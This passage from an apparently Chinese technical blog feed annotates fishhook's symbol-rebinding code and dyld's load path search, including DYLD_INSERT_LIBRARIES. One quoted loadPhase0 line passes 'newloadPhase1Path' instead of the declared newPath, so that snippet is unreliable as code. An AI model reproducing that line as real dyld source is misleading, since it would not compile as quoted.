class="built_in">strlen</span>(symbol_name) &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">            <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">		  <span class="comment">//找到相同的函数替换指针</span></span><br><span class="line">          <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">              indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">            *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">          &#125;</span><br><span class="line">          indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">          <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  symbol_loop:;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//typedef struct &#123;</span></span><br><span class="line"><span class="comment">//    const char *dli_fname;  /* Pathname of shared object that</span></span><br><span class="line"><span class="comment">//                               contains address */</span></span><br><span class="line"><span class="comment">//    void       *dli_fbase;  /* Address at which shared object</span></span><br><span class="line"><span class="comment">//                               is loaded */</span></span><br><span class="line"><span class="comment">//    const char *dli_sname;  /* Name of nearest symbol with address</span></span><br><span class="line"><span class="comment">//                               lower than addr */</span></span><br><span class="line"><span class="comment">//    void       *dli_saddr;  /* Exact address of symbol named</span></span><br><span class="line"><span class="comment">//                               in dli_sname */</span></span><br><span class="line"><span class="comment">//&#125; Dl_info;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rebind_symbols_for_image</span><span class="params">(<span class="keyword">struct</span> rebindings_entry *rebindings,</span><br><span class="line">                                     <span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                     intptr_t slide)</span> </span>&#123;</span><br><span class="line">  <span class="comment">//获取Dl_info</span></span><br><span class="line">  Dl_info info;</span><br><span class="line">  <span class="keyword">if</span> (dladdr(header, &amp;info) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">	</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">segment_command_t</span> *cur_seg_cmd;</span><br><span class="line">  <span class="keyword">segment_command_t</span> *linkedit_segment = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> symtab_command* symtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">struct</span> dysymtab_command* dysymtab_cmd = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uintptr_t</span> cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_LINKEDIT) == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">//在lc_segment中遍历寻找__LINKEDIT的section</span></span><br><span class="line">        linkedit_segment = cur_seg_cmd;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_symtab</span></span><br><span class="line">      symtab_cmd = (<span class="keyword">struct</span> symtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_DYSYMTAB) &#123;</span><br><span class="line">	  <span class="comment">//遍历寻找lc_dysymtab</span></span><br><span class="line">      dysymtab_cmd = (<span class="keyword">struct</span> dysymtab_command*)cur_seg_cmd;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//检测必要的数据结构是否都存在</span></span><br><span class="line">  <span class="comment">/*</span><br><span class="line">  LC_SYMTAB这个LoadCommand主要提供了两个信息</span><br><span class="line">	Symbol Table的偏移量与Symbol Table中元素的个数</span><br><span class="line">	String Table的偏移量与String Table的长度</span><br><span class="line">  LC_DYSYMTAB</span><br><span class="line">	提供了动态符号表的位移和元素个数，还有一些其他的表格索引</span><br><span class="line">  LC_SEGMENT.__LINKEDIT</span><br><span class="line">	含有为动态链接库使用的原始数据</span><br><span class="line">  */</span></span><br><span class="line">  <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">      !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find base symbol/string table addresses</span></span><br><span class="line">  <span class="comment">// 获取链接时程序的基址</span></span><br><span class="line">  <span class="comment">// 基址 = __LINKEDIT.VM_Address - __LINK.File_Offset + silde的改变值</span></span><br><span class="line">  <span class="comment">// machoview随便看一个程序的__LINKEDIT</span></span><br><span class="line">  <span class="comment">// offset 	| data 					| Description 		| value</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// 0x0000390	  0x0000000100002000	  VM Address		  4294975488</span></span><br><span class="line">  <span class="comment">// 0x0000398	  0x0000000000003000	  VM Size			  12288</span></span><br><span class="line">  <span class="comment">// 0x00003A0    0x0000000000002000	  File Offset		  8192</span></span><br><span class="line">  <span class="comment">// 0x00003A8    0x0000000000002690	  File Size			  9872</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// base = 100002000-2000 + slide = 0x0000000100000000 + slide</span></span><br><span class="line">  <span class="comment">// 这应该是一个公式</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> linkedit_base = (<span class="keyword">uintptr_t</span>)slide + linkedit_segment-&gt;vmaddr - linkedit_segment-&gt;fileoff;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 符号表的地址 = 基址 + 符号表偏移量</span></span><br><span class="line">  <span class="keyword">nlist_t</span> *symtab = (<span class="keyword">nlist_t</span> *)(linkedit_base + symtab_cmd-&gt;symoff);</span><br><span class="line">  <span class="comment">// 字符串表的地址 = 基址 + 字符串表偏移量</span></span><br><span class="line">  <span class="keyword">char</span> *strtab = (<span class="keyword">char</span> *)(linkedit_base + symtab_cmd-&gt;stroff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get indirect symbol table (array of uint32_t indices into symbol table)</span></span><br><span class="line">  <span class="comment">// 动态符号表地址 = 基址 + 动态符号表偏移量</span></span><br><span class="line">  <span class="keyword">uint32_t</span> *indirect_symtab = (<span class="keyword">uint32_t</span> *)(linkedit_base + dysymtab_cmd-&gt;indirectsymoff);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//再一次遍历loadcommands</span></span><br><span class="line">  cur = (<span class="keyword">uintptr_t</span>)header + <span class="keyword">sizeof</span>(<span class="keyword">mach_header_t</span>);</span><br><span class="line">  <span class="keyword">for</span> (uint i = <span class="number">0</span>; i &lt; header-&gt;ncmds; i++, cur += cur_seg_cmd-&gt;cmdsize) &#123;</span><br><span class="line">    cur_seg_cmd = (<span class="keyword">segment_command_t</span> *)cur;</span><br><span class="line">    <span class="keyword">if</span> (cur_seg_cmd-&gt;cmd == LC_SEGMENT_ARCH_DEPENDENT) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA) != <span class="number">0</span> &amp;&amp;</span><br><span class="line">          <span class="built_in">strcmp</span>(cur_seg_cmd-&gt;segname, SEG_DATA_CONST) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="comment">//找到__DATA和__DATA_CONST的section</span></span><br><span class="line">	  <span class="comment">//__DATA section里面保存的是符号跳转的函数指针表</span></span><br><span class="line">	  <span class="comment">// 对__nl_symbol_ptr以及__la_symbol_ptr进行rebind</span></span><br><span class="line">      <span class="keyword">for</span> (uint j = <span class="number">0</span>; j &lt; cur_seg_cmd-&gt;nsects; j++) &#123;</span><br><span class="line">        <span class="keyword">section_t</span> *sect =</span><br><span class="line">          (<span class="keyword">section_t</span> *)(cur + <span class="keyword">sizeof</span>(<span class="keyword">segment_command_t</span>)) + j;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">          perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> _rebind_symbols_for_image(<span class="keyword">const</span> <span class="keyword">struct</span> mach_header *header,</span><br><span class="line">                                      <span class="keyword">intptr_t</span> slide) &#123;</span><br><span class="line">    rebind_symbols_for_image(_rebindings_head, header, slide);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols_image</span><span class="params">(<span class="keyword">void</span> *header,</span><br><span class="line">                         intptr_t slide,</span><br><span class="line">                         <span class="keyword">struct</span> rebinding rebindings[],</span><br><span class="line">                         size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> rebindings_entry *rebindings_head = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> retval = prepend_rebindings(&amp;rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">    rebind_symbols_for_image(rebindings_head, header, slide);</span><br><span class="line">    <span class="built_in">free</span>(rebindings_head);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rebind_symbols</span><span class="params">(<span class="keyword">struct</span> rebinding rebindings[], size_t rebindings_nel)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> retval = prepend_rebindings(&amp;_rebindings_head, rebindings, rebindings_nel);</span><br><span class="line">  <span class="keyword">if</span> (retval &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// If this was the first call, register callback for image additions (which is also invoked for</span></span><br><span class="line">  <span class="comment">// existing images, otherwise, just run on existing images</span></span><br><span class="line">  <span class="keyword">if</span> (!_rebindings_head-&gt;next) &#123;</span><br><span class="line">    _dyld_register_func_for_add_image(_rebind_symbols_for_image);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> c = _dyld_image_count();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; c; i++) &#123;</span><br><span class="line">      _rebind_symbols_for_image(_dyld_get_image_header(i), _dyld_get_image_vmaddr_slide(i));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="小结">小结</h1><p>整个流程中最复杂的部分是<code>perform_rebinding_with_section</code>实现的功能。</p>
<p>简单的概括流程：</p>
<ul>
<li>通过<code>__la_symbol_ptr</code>的<code>reserved1</code>字段找到第一个需要动态绑定的符号在动态符号表中的位置。</li>
</ul>
<ul>
<li>通过<code>__la_symbol_ptr</code>中提供的数据找到在<code>symbol table</code>中的数据。</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/__la_symbol_ptr.png" alt="图1"></p>
<p>图上可以看到<code>reserved1</code>被machoview工具修改成了<code>Indirect Sym Index</code>,他的值是3.</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/indirect symbols.png" alt="图2"></p>
<p>可以看到<strong>第四个</strong>就是需要延时绑定的符号开始的地方。上面的值是<strong>3</strong>。</p>
<p>因为<strong>0，1，2，3….</strong></p>
<p>所以找到了他在符号表中的<strong>偏移量</strong>。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/symbol%20table.png" alt="图3"></p>
<p>后面的逻辑就比较好理解了，找到目标函数，替换目标函数。</p>
<h1 id="PS">PS</h1><p>从<code>github</code>可以获取注释后的代码。</p>
<p><a href="https://github.com/turingH/fishhook_analysis" target="_blank" rel="external">https://github.com/turingH/fishhook_analysis</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>没什么特别要说的，详细看代码，可以结合之前的两篇文章，更好的理解这部分内容。</p>
<p><a href="http://BLOGIMAGE/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
<p><a href="http://BLOGIMAGE/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">mach-o延时绑定</a><br>]]>
    
    </summary>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="hook" scheme="http://turingh.github.io/tags/hook/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="osx" scheme="http://turingh.github.io/tags/osx/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[dyld源码分析-动态加载load]]></title>
    <link href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/"/>
    <id>http://turingh.github.io/2016/03/16/dyld源码分析load/</id>
    <published>2016-03-16T19:13:52.000Z</published>
    <updated>2016-03-24T03:35:50.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在<code>OS X</code>或者<code>IOS</code>上运行一个程序时，dyld除了需要加载主要的执行程序之外，还需要加载需要的库文件以及库文件依赖的库文件。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// instantiate ImageLoader for main executable</span></span><br><span class="line">sMainExecutable = instantiateFromLoadedImage(mainExecutableMH, mainExecutableSlide, sExecPath);<span class="comment">//加载MACHO到image</span></span><br></pre></td></tr></table></figure>
<p>这一条函数调用加载了需要运行的程序，具体详细分析可以参考<a href="http://BLOGIMAGE/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/" target="_blank" rel="external">dyld中mach-o文件加载的简单分析</a>。</p>
<p>而在<code>link</code>主程序之前还会动态的加载一些其他的库文件。例如<code>DYLD_INSERT_LIBRARIES</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load any inserted libraries</span></span><br><span class="line"><span class="comment">// 类似于linux里面的LD_PRELOAD</span></span><br><span class="line"><span class="keyword">if</span>	( sEnv.DYLD_INSERT_LIBRARIES != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* lib = sEnv.DYLD_INSERT_LIBRARIES; *lib != <span class="literal">NULL</span>; ++lib) </span><br><span class="line">		loadInsertedDylib(*lib); <span class="comment">//!!!动态加载dylib</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// record count of inserted libraries so that a flat search will look at </span></span><br><span class="line"><span class="comment">// inserted libraries, then main, then others.</span></span><br><span class="line">sInsertedDylibCount = sAllImages.size()-<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p><code>loadInsertedDylib</code>的实现其实就是简单的调用<code>load</code>函数。通过简单的分析<code>load</code>函数，增强对dyld工作流程的理解。</p>
<a id="more"></a>
<h1 id="0x01_为什么要分析Load函数">0x01 为什么要分析Load函数</h1><p>通过一个简单的图，可以看到<code>Load</code>函数的调用者都是哪些函数。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/CalledBy-load.png" alt="load调用"></p>
<p>除了前面提到的<code>loadInsertedDylib</code>函数之外接触的比较多的就是<code>dlopen</code>了，所以，可以看出<code>load</code>是<code>dyld</code>动态加载一个<code>Mach-O</code>文件的重要接口。在动态加载一个<code>Mach</code>-o文件的时候，最终都调用了<code>load</code>这个API。</p>
<h1 id="0x02_Load函数分析">0x02 Load函数分析</h1><p><code>Load</code>函数的实现为一系列的<code>loadPhase*</code>函数，主要可以分为这几个部分</p>
<ul>
<li>处理环境变量，生成各种搜索路径。</li>
<li>如果该<code>lib</code><strong>已经</strong>加载过，则利用<code>share_cache</code>中已经存在的<code>imageloader</code>实例。</li>
<li>如果该<code>lib</code>没有加载过，通过读取文件，将mach-o文件映射到内存中，生成<code>imageloader</code>的实例。</li>
</ul>
<h2 id="2-1_load">2.1 load</h2><p>通过一幅图可以简单的理解<code>load</code>函数的流程。<code>load</code>函数主要做的这几件事情：</p>
<ul>
<li><p>处理suffix字段。</p>
</li>
<li><p>通过<code>loadPhase0</code>函数从<code>share_cache</code>中加载<code>image</code>。</p>
</li>
<li><p>如果<code>share_cache</code>中<strong>不存在</strong><code>image</code>，则再使用<strong>不同的参数</strong>调用<code>loadPhase0</code>函数，通过<code>open</code>函数读取文件并加载<code>image</code>到内存中。</p>
</li>
<li><p>函数调用结束后的内存管理。</p>
<p>​</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/load.png" alt="load"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据所有的环境变量生成路径，去加载一个ImageLoader</span></span><br><span class="line"><span class="function">ImageLoader* <span class="title">load</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> LoadContext&amp; context)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	CRSetCrashLogMessage2(path);</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span>* orgPath = path;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s)\n", __func__ , path);</span></span><br><span class="line">	<span class="keyword">char</span> realPath[PATH_MAX];</span><br><span class="line">	<span class="comment">// when DYLD_IMAGE_SUFFIX is in used, do a realpath(), otherwise a load of "Foo.framework/Foo" will not match</span></span><br><span class="line">	<span class="comment">// 当设置了DYLD_IMAGE_SUFFIX字段，需要使用realpath来加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ( gLinkContext.imageSuffix != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( realpath(path, realPath) != <span class="literal">NULL</span> )</span><br><span class="line">			path = realPath;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// try all path permutations and check against existing loaded images</span></span><br><span class="line">	<span class="comment">// 尝试各种路径组合去加载image</span></span><br><span class="line">	ImageLoader* image = loadPhase0(path, orgPath, context, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try all path permutations and try open() until first success</span></span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt; exceptions;</span><br><span class="line">	image = loadPhase0(path, orgPath, context, &amp;exceptions);</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">/*...*/</span></span><br><span class="line"></span><br><span class="line">    CRSetCrashLogMessage2(<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> ( image != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 加载成功内存处理*/</span></span><br><span class="line">		<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> ( exceptions.size() == <span class="number">0</span> ) &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* 出错处理 */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-2_loadPhase0函数">2.2 loadPhase0函数</h2><p><code>loadPhase0</code>函数逻辑比较简单</p>
<ul>
<li>遍历<code>DYLD_ROOT_PATH</code>环境变量，生成加载路径，调用<code>loadPhase1</code>。</li>
<li>如果不存在<code>DYLD_ROOT_PATH</code>环境变量，则使用原始的路径</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// try root substitutions</span></span><br><span class="line"><span class="comment">// 主要处理DYLD_ROOT_PATH环境变量的功能，修饰Loadimage时候的path</span></span><br><span class="line"><span class="comment">// 运行完结之后执行loadPhase1</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase0</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">// handle DYLD_ROOT_PATH which forces absolute paths to use a new root</span></span><br><span class="line">	<span class="keyword">if</span> ( (gLinkContext.rootPaths != <span class="literal">NULL</span>) &amp;&amp; (path[<span class="number">0</span>] == <span class="string">'/'</span>) ) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span>* rootPath = gLinkContext.rootPaths ; *rootPath != <span class="literal">NULL</span>; ++rootPath) &#123;</span><br><span class="line">			<span class="keyword">char</span> newPath[<span class="built_in">strlen</span>(*rootPath) + <span class="built_in">strlen</span>(path)+<span class="number">2</span>];</span><br><span class="line">			<span class="built_in">strcpy</span>(newPath, *rootPath);</span><br><span class="line">			<span class="built_in">strcat</span>(newPath, path);</span><br><span class="line">			ImageLoader* image = loadPhase1(newloadPhase1Path, orgPath, context, exceptions);</span><br><span class="line">			<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">				<span class="keyword">return</span> image;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// try raw path</span></span><br><span class="line">	<span class="keyword">return</span> loadPhase1(path, orgPath, context, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-3_loadPhase1">2.3 loadPhase1</h2><p><code>loadPhase</code>主要处理内容：</p>
<ul>
<li>通过<code>LD_LIBRARY_PATH</code>参数组成的所有路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>当无法通过<code>LD_LIBRARY_PATH</code>获取<code>image</code>时，则通过<code>DYLD_FRAMEWORK_PATH</code>与<code>DYLD_LIBRARY_PATH</code>组成的路径，通过<code>loadPhase2</code>尝试加载<code>image</code>。</li>
<li>如果上面两个流程都无法加载到image则通过原始路径通过<code>loadPhase3</code>尝试加载<code>image</code>。</li>
<li>如果依然无法加载到image则通过<code>DYLD_FALLBACK_FRAMEWORK_PATH</code>环境变量，组成路径最后尝试加载<code>image</code>。</li>
</ul>
<p>这里要<strong>注意一下</strong>，因为不同的分支使用的<code>Phase</code>函数有可能是不同的。同时该函数也确定了环境变量在动态加载时的优先级。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ImageLoader* <span class="title">loadPhase1</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* path, <span class="keyword">const</span> <span class="keyword">char</span>* orgPath, <span class="keyword">const</span> LoadContext&amp; context, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;* exceptions)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">//dyld::log("%s(%s, %p)\n", __func__ , path, exceptions);</span></span><br><span class="line">	ImageLoader* image = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle LD_LIBRARY_PATH environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果存在LD_LIBRARY_PATH变量，优先通过LD_LIBRARY_PATH中设置的路径进行搜索和加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useLdLibraryPath &amp;&amp; (sEnv.LD_LIBRARY_PATH != <span class="literal">NULL</span>) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, <span class="literal">NULL</span>, sEnv.LD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span class="keyword">if</span> ( image != <span class="literal">NULL</span> )</span><br><span class="line">			<span class="keyword">return</span> image;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// handle DYLD_ environment variables that force searching</span></span><br><span class="line">	<span class="comment">// 如果使用了DYLD_FRAMEWORK_PATH或者sEnv.DYLD_LIBRARY_PATH，则使用这两个环境变量去加载</span></span><br><span class="line">	<span class="keyword">if</span> ( context.useSearchPaths &amp;&amp; ((sEnv.DYLD_FRAMEWORK_PATH != <span class="literal">NULL</span>) || (sEnv.DYLD_LIBRARY_PATH != <span class="literal">NULL</span>)) ) &#123;</span><br><span class="line">		image = loadPhase2(path, orgPath, context, sEnv.DYLD_FRAMEWORK_PATH, sEnv.DYLD_LIBRARY_PATH, exceptions);</span><br><span class="line">		<span 